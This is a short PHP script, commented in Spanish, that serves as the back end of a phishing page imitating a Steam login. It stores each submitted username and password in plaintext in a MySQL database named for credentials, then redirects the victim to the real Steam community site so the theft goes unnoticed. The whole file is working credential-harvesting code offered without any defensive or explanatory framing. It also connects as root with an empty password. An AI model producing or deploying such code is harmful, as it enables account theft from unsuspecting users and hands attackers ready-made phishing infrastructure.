<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Conectar a la base de datos MySQL
    $servername = "localhost";  // Normalmente 'localhost'
    $database = "credenciales_db";  // Nombre de la base de datos
    $db_username = "root";  // Nombre de usuario de MySQL (por defecto es 'root')
    $db_password = "";  // Contraseña de MySQL (por defecto es vacía)

    // Crear conexión
    $conn = new mysqli($servername, $db_username, $db_password, $database);

    // Verificar la conexión
    if ($conn->connect_error) {
        die("Error de conexión: " . $conn->connect_error);
    }

    // Preparar la consulta SQL para insertar los datos
    $sql = "INSERT INTO usuarios (username, password) VALUES (?, ?)";

    // Preparar la declaración SQL
    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        die("Error al preparar la consulta: " . $conn->error);
    }

    // Enlazar los parámetros
    $stmt->bind_param("ss", $username, $password);

    // Ejecutar la declaración
    if ($stmt->execute()) {
        // Redirigir al usuario a la página original de Steam
        header('Location: https://steamcommunity.com/');
        exit();
    } else {
        echo "Error al guardar los datos: " . $stmt->error;
    }

    // Cerrar la declaración y la conexión
    $stmt->close();
    $conn->close();
}
?>
